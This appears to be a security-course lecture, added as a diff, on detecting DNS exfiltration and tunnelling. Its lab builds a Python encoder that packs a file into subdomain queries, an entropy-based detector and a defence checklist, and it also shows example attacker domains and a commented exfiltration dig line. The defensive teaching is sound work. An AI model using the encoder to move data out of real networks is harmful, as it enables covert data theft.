@@ -1,0 +1,301 @@
+<h1 id="dns-exfiltration-and-tunneling-detection">DNS Exfiltration and Tunneling Detection</h1>
+<h2 id="summary">Summary</h2>
+<p>Traffic rarely leaves through the place you are watching. DNS is a strong candidate: it is<br />
+required before almost anything else works, it is usually permitted, and it is rarely inspected.<br />
+This lecture is about building a detector.</p>
+<h2 id="key-ideas">Key ideas</h2>
+<ul>
+<li><strong>DNS exfiltration</strong> encodes data into subdomain labels and lets the resolver deliver it</li>
+<li><code>4f6752ba2321b7a3.hexpayload.attacker.com</code> — each query carries a few bytes</li>
+<li>Detection signals: <strong>subdomain entropy</strong>, query volume, query length, unusual TLDs,<br />
+  responses that are always NXDOMAIN (a tunnel, not real resolution)</li>
+<li><strong>DNS tunnelling</strong> (iodine, dns2tcp) carries a whole channel inside DNS</li>
+<li><strong>C2 over DNS</strong>: the malware queries a domain and reads instructions from TXT or A records</li>
+<li><strong>Defences</strong>: log everything, alert on entropy, restrict egress to your resolver only</li>
+</ul>
+<h2 id="terminology">Terminology</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>DNS exfiltration</strong></td>
+<td>Data smuggled out inside DNS queries</td>
+</tr>
+<tr>
+<td><strong>Subdomain label</strong></td>
+<td>The part before the registrable domain</td>
+</tr>
+<tr>
+<td><strong>Entropy</strong></td>
+<td>Randomness; high in encoded data, low in real names</td>
+</tr>
+<tr>
+<td><strong>NXDOMAIN</strong></td>
+<td>The domain does not exist — expected in a tunnel</td>
+</tr>
+<tr>
+<td><strong>DNS tunnel</strong></td>
+<td>A full channel inside DNS</td>
+</tr>
+<tr>
+<td><strong>iodine / dns2tcp</strong></td>
+<td>DNS tunnelling tools</td>
+</tr>
+<tr>
+<td><strong>C2 over DNS</strong></td>
+<td>Command and control using DNS</td>
+</tr>
+<tr>
+<td><strong>TXT record</strong></td>
+<td>Free-text record, used to carry C2 data</td>
+</tr>
+<tr>
+<td><strong>Egress filtering</strong></td>
+<td>Outbound network policy</td>
+</tr>
+<tr>
+<td><strong>Resolver log</strong></td>
+<td>The single most valuable DNS evidence source</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kali-commands">Kali commands</h2>
+<pre><code class="language-bash">command -v dig whois host jq
+
+# --- build a query that encodes data, by hand ---
+PAYLOAD=$(printf 'AEGIS-TEST' | xxd -p)
+echo &quot;encoded payload: $PAYLOAD&quot;
+for i in $(seq 1 4); do
+  frag=${PAYLOAD:$(( (i-1)*8 )):8}
+  [ -n &quot;$frag&quot; ] &amp;&amp; echo &quot;  would query: ${frag}.tunnel.example.com&quot;
+done
+
+# --- actually do it, against a domain you control (lab only) ---
+# dig +short b64fragment.yourdomain.com
+# dig +short -x &lt;ip&gt;    # reverse lookups can also carry data
+
+# --- what a normal query looks like ---
+dig +short www.google.com
+dig +short analytics.google.com
+echo &quot;  real names: low entropy, common TLDs, real answers&quot;
+
+# --- detection inputs ---
+# 1. query count by parent domain
+sudo journalctl -u systemd-resolved --since &quot;1 hour ago&quot; --no-pager 2&gt;/dev/null \
+  | grep -oE '[a-z0-9.-]+\.[a-z]{2,}' | awk -F. '{print $(NF-1)&quot;.&quot;$NF}' \
+  | sort | uniq -c | sort -rn | head -15
+
+# 2. subdomain length distribution
+sudo journalctl -u systemd-resolved --since &quot;1 hour ago&quot; --no-pager 2&gt;/dev/null \
+  | grep -oE '[a-zA-Z0-9]{20,}' | head -10
+
+# 3. entropy of long labels, in python
+python3 - &lt;&lt;'PY'
+import math, collections
+def entropy(s):
+    if not s: return 0
+    c = collections.Counter(s)
+    n = len(s)
+    return -sum((v/n) * math.log2(v/n) for v in c.values())
+samples = [&quot;www&quot;,&quot;analytics&quot;,&quot;mail&quot;,&quot;static-cdn&quot;,&quot;accounts&quot;,
+           &quot;a3f9c2b8e1d4470a9c5b2e8f1d0a7c3b9&quot;,&quot;deadbeefcafebabe0123456789abcdef&quot;]
+for s in samples:
+    print(f&quot;  {entropy(s):.2f} bits/char  {s}&quot;)
+print()
+print(&quot;  Encoded payloads sit near 4.0 bits/char. Real words sit near 2.0-2.5.&quot;)
+PY
+
+# 4. TXT records and unusual answers
+dig +short TXT _dmarc.google.com
+dig +short TXT &lt;your-lab-domain&gt;
+</code></pre>
+<h2 id="field-lab">Field lab</h2>
+<p><strong>Objective:</strong> build a DNS-exfiltration encoder, a matching detector, and validate both.</p>
+<pre><code class="language-bash">mkdir -p ~/aegis/labs/pkt-06 &amp;&amp; cd ~/aegis/labs/pkt-06
+
+# --- 1. the encoder, written out so it is auditable ---
+cat &gt; encode.py &lt;&lt;'PY'
+#!/usr/bin/env python3
+&quot;&quot;&quot;
+dns_exfil_encode.py - encode a file into DNS subdomains.
+LAB ONLY. You must own the parent domain to receive the data, and you must
+have written authorisation to test anything beyond your own machine.
+&quot;&quot;&quot;
+import base64, sys
+
+def encode(path, chunk=30):
+    raw = open(path, &quot;rb&quot;).read()
+    b64 = base64.b64encode(raw).decode().rstrip(&quot;=&quot;)
+    return [b64[i:i+chunk] for i in range(0, len(b64), chunk)]
+
+def entropy(s):
+    import collections, math
+    if not s: return 0.0
+    c = collections.Counter(s)
+    n = len(s)
+    return -sum((v/n) * math.log2(v/n) for v in c.values())
+
+if __name__ == &quot;__main__&quot;:
+    path = sys.argv[1] if len(sys.argv) &gt; 1 else &quot;message.txt&quot;
+    domain = sys.argv[2] if len(sys.argv) &gt; 2 else &quot;tunnel.example.com&quot;
+    labels = encode(path)
+    print(f&quot;  {path} -&gt; {len(labels)} queries&quot;)
+    print(f&quot;  first: {labels[0]}.{domain}&quot;)
+    print(f&quot;  mean label entropy: {sum(entropy(l) for l in labels)/len(labels):.2f} bits/char&quot;)
+    with open(&quot;queries.txt&quot;, &quot;w&quot;) as f:
+        for l in labels:
+            f.write(f&quot;{l}.{domain}\n&quot;)
+PY
+chmod +x encode.py
+echo &quot;AEGIS exfiltration test - this is a lab exercise on my own domain.&quot; &gt; message.txt
+python3 encode.py message.txt | tee 01-encode.txt
+head -3 queries.txt
+
+# --- 2. transmit it, loopback only (no real exfiltration) ---
+echo
+echo &quot;=== resolving the generated names locally, to show the query shape ===&quot;
+while read -r q; do
+  # resolve against localhost: no traffic leaves the machine
+  dig +short &quot;$q&quot; @127.0.0.1 &gt;/dev/null 2&gt;&amp;1
+done &lt; &lt;(head -2 queries.txt)
+echo &quot;  (queries issued to 127.0.0.1 only - nothing left this machine)&quot;
+
+# --- 3. the detector ---
+cat &gt; detect.py &lt;&lt;'PY'
+#!/usr/bin/env python3
+&quot;&quot;&quot;
+detect.py - score DNS queries for exfiltration indicators.
+Input: one query name per line. Output: score + reason.
+&quot;&quot;&quot;
+import sys, math, collections
+
+COMMON_TLDS = {&quot;com&quot;,&quot;net&quot;,&quot;org&quot;,&quot;co&quot;,&quot;io&quot;,&quot;gov&quot;,&quot;edu&quot;,&quot;uk&quot;,&quot;de&quot;,&quot;fr&quot;,&quot;info&quot;}
+def entropy(s):
+    if not s: return 0.0
+    c = collections.Counter(s)
+    n = len(s)
+    return -sum((v/n) * math.log2(v/n) for v in c.values())
+
+def score(name):
+    labels = name.strip().rstrip(&quot;.&quot;).split(&quot;.&quot;)
+    if len(labels) &lt; 2: return 0, &quot;too short&quot;
+    reasons, pts = [], 0
+    sub = labels[0]
+    e = entropy(sub)
+    if len(sub) &gt;= 20: pts += 2; reasons.append(f&quot;long label ({len(sub)} chars)&quot;)
+    if e &gt;= 3.5:      pts += 3; reasons.append(f&quot;high entropy ({e:.2f})&quot;)
+    if re_like(sub):  pts += 2; reasons.append(&quot;base64/hex character set&quot;)
+    tld = labels[-1]
+    if tld not in COMMON_TLDS: pts += 2; reasons.append(f&quot;uncommon TLD .{tld}&quot;)
+    if len(labels) &gt; 4:     pts += 1; reasons.append(&quot;deep subdomain&quot;)
+    return pts, &quot;; &quot;.join(reasons) or &quot;looks normal&quot;
+
+def re_like(s):
+    import re
+    return bool(re.fullmatch(r&quot;[A-Za-z0-9+/=_-]{16,}&quot;, s))
+
+if __name__ == &quot;__main__&quot;:
+    lines = [l for l in open(sys.argv[1]) if l.strip()]
+    scored = [(score(l), l.strip()) for l in lines]
+    scored.sort(key=lambda x: -x[0][0])
+    for (pts, why), name in scored[:15]:
+        flag = &quot;*** EXFIL-SUSPICIOUS&quot; if pts &gt;= 4 else &quot;ok&quot;
+        print(f&quot;  {pts:&gt;2}  {flag:&lt;18} {name[:52]}  [{why}]&quot;)
+    hits = sum(1 for (p,_),_ in scored if p &gt;= 4)
+    print(f&quot;\n  {hits}/{len(scored)} queries scored above the exfil threshold&quot;)
+PY
+chmod +x detect.py
+
+# feed it a mix of real names and exfil labels
+cat &gt; mixed.txt &lt;&lt;'EOF'
+www.google.com
+mail.google.com
+analytics.google.com
+docs.google.com
+accounts.google.com
+static.google.com
+a3f9c2b8e1d4470a9c5b2e8f1d0a7c3b9.tunnel.example.com
+deadbeefcafebabe0123456789abcdefdeadbeef.tunnel.example.com
+ZmFrZS1sb2dhbC10ZXN0LWRhdGE.tunnel.example.com
+support.microsoft.com
+cdn.jsdelivr.net
+EOF
+echo &quot;=== detector output ===&quot;
+python3 detect.py mixed.txt | tee 02-detect.txt
+
+# --- 4. the same thing in shell, for comparison ---
+echo
+echo &quot;=== entropy of the labels, in shell (awk) ===&quot;
+awk -F. '{label=$1; n=length(label);
+  for(i=1;i&lt;=n;i++){ch=substr(label,i,1); c[ch]++}
+  e=0; for(k in c){p=c[k]/n; e-=p*log(p)/log(2)}
+  printf &quot;  %.2f bits/char  %s\n&quot;, e, $0}' mixed.txt | sort -rn | tee 03-entropy.txt
+
+# --- 5. the defence, in the order you would deploy it ---
+cat &gt; 04-defence.md &lt;&lt;'EOF'
+# Detecting and preventing DNS tunnelling
+
+## 1. Log everything (do this first)
+    logging { query; response; };
+or equivalent in resolved/your resolver. Without logs you have no detection
+and no evidence. This is the single highest-value control in this lecture.
+
+## 2. Alert on the signals
+- subdomain label entropy above ~3.5 bits/char
+- label length above 30 characters
+- base64 or hex character sets in labels
+- query volume per registered domain far above its baseline
+- high proportion of NXDOMAIN responses
+- any TXT response that is not a known SPF/DKIM record
+
+## 3. Constrain egress
+Force all hosts to use your internal resolvers, and block direct outbound
+port 53 from endpoints. A client that cannot choose its own resolver cannot
+exfiltrate through one.
+
+## 4. Constrain the payload
+Filter at the resolver: reject labels matching `[A-Za-z0-9+/=]{30,}`.
+Crude, but effective, and it is a legitimate production control.
+
+## 5. Egress firewall as the backstop
+Only the resolvers and proxies may reach the internet. Everything else speaks
+to them.
+
+## What you are actually defending against
+Data leaving through a channel that was never designed to carry it, by an
+application that never touches the network directly. The same reasoning
+applies to DNS-over-HTTPS: it is legitimate, and it removes your visibility,
+so it deserves an explicit policy decision rather than an accident.
+EOF
+cat 04-defence.md
+
+# --- 6. a working baseline for this machine ---
+{
+  echo &quot;=== current DNS behaviour on this host ===&quot;
+  cat /etc/resolv.conf | grep nameserver | sed 's/^/  /'
+  echo
+  echo &quot;=== are queries being logged anywhere? ===&quot;
+  journalctl -u systemd-resolved --since &quot;1 hour ago&quot; --no-pager 2&gt;/dev/null | wc -l | xargs echo &quot;  resolved log lines:&quot;
+  journalctl -u dnsmasq --since &quot;1 hour ago&quot; --no-pager 2&gt;/dev/null | wc -l | xargs echo &quot;  dnsmasq log lines:&quot;
+  echo &quot;  (zero on both = you have no DNS visibility at all)&quot;
+} 2&gt;&amp;1 | tee 05-baseline.txt
+</code></pre>
+<p><strong>Step 5 is the practical finding:</strong> most machines log nothing about DNS, so this class of<br />
+exfiltration would be completely invisible on this box right now.</p>
+<p><strong>Record:</strong> <code>02-detect.txt</code> and <code>04-defence.md</code>.</p>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>How does DNS exfiltration encode data, and what is the receive side?</li>
+<li>Which statistical signal best distinguishes an exfil label from a real hostname?</li>
+<li>Why is a high NXDOMAIN rate a tunnel indicator?</li>
+<li>What control must be in place before any detection is possible?</li>
+<li>Why does forcing an internal resolver defeat most DNS tunnelling?</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>DNS</strong> → <strong>Tunneling Evasion</strong> → <strong>Log Analysis</strong> → <strong>IDS / IPS</strong> → <strong>Exfiltration</strong> →<br />
+<strong>C2 over DNS</strong>.</p>
